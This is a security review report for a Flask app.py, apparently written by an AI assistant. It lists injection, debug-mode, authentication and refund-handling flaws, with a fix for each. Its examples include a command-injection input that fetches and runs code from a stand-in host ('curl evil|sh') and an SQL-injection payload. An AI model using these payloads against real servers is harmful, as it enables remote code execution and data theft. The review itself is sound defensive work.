@@ -1,0 +1,57 @@
+# Security review of `app.py`
+
+I only read the file and changed nothing. The fixes are in priority order.
+
+## 1. Critical: command injection in `/export` (line 30)
+`fmt` comes straight from the query string and is interpolated into a command run with `shell=True`. A request like `/export?format=csv;curl evil|sh` runs arbitrary commands on the server.
+
+**Fix:**
+- Check `fmt` against an allowlist, such as `{"csv", "json"}`, and return 400 for anything else.
+- Drop the shell: `subprocess.check_output(["python", "export.py", "--format", fmt])`.
+
+## 2. Critical: SQL injection in `/orders` (line 23)
+`customer` is placed into the SQL with an f-string. `?customer=' OR '1'='1` dumps every order, and UNION payloads can read other tables.
+
+**Fix:**
+- Use a parameterized query: `conn.execute("SELECT * FROM orders WHERE customer = ?", (customer,))`.
+- Return 400 if `customer` is missing. It is currently `None`.
+- Close the connection, for example with `contextlib.closing`.
+
+## 3. Critical: Flask debug mode, bound to all interfaces (line 41)
+`debug=True` with `host="0.0.0.0"` exposes the Werkzeug interactive debugger to the network. That gives remote code execution to anyone who can reach the port, since the PIN is weak protection.
+
+**Fix:**
+- Remove `debug=True` and bind to `127.0.0.1`.
+- In production, run behind gunicorn or uwsgi and control the debug setting through the environment, not the code.
+
+## 4. High: no authentication or authorization on any endpoint
+- `/orders` returns any customer's data to anyone.
+- `/refund` and `/export` need no login either.
+- `API_KEY` is defined but never checked.
+
+**Fix:** Add authentication, such as a token check or session login. Make sure a user can only see their own orders. Restrict `/refund` and `/export` to privileged roles.
+
+## 5. Medium: `/refund` is unsafe and has no business checks (lines 10–16, 36)
+- **Crashes on bad input:** a missing `amount` field gives a 400, but `"abc"` or `"1.2.3"` raises an unhandled `ValueError`, which becomes a 500. In debug mode that leaks a stack trace.
+- **Wrong cents:** `"$5.5"` becomes 5 dollars and 5 cents (505) instead of 550. `"5.123"` gives the wrong value too.
+- **Negative amounts:** `"-5"` is accepted, so refunds can go negative.
+- **Missing checks:** the endpoint doesn't reference an order and doesn't verify that the refund is allowed.
+- **CSRF:** a POST endpoint that moves money has no CSRF protection.
+
+**Fix:**
+- Parse with `decimal.Decimal`, quantize to cents, reject negatives and zero, and catch `InvalidOperation`.
+- Tie each refund to an order ID and check it against what was paid.
+- Add CSRF protection or token-based auth.
+
+## 6. Low: hardcoded secret (line 7)
+The key is labelled a demo and not real, but the pattern gets copied. A real key committed here would be exposed through git history.
+
+**Fix:** Load it from an environment variable or a secrets manager, e.g. `os.environ["API_KEY"]`. Compare it with `hmac.compare_digest` when you start using it.
+
+## 7. Low: hardening gaps
+- Add rate limiting, especially on `/export` and `/refund`.
+- Set security headers and cap request size.
+- `/export` returns raw subprocess bytes with no content type or error handling. A failing script raises `CalledProcessError`, which is a 500.
+- Log refunds and exports for auditing.
+
+**Suggested order:** do 1–3 first. Each is a one-line change that closes a remote-compromise path. Then do 4, since the other fixes matter less while the endpoints are open. Then 5–7.
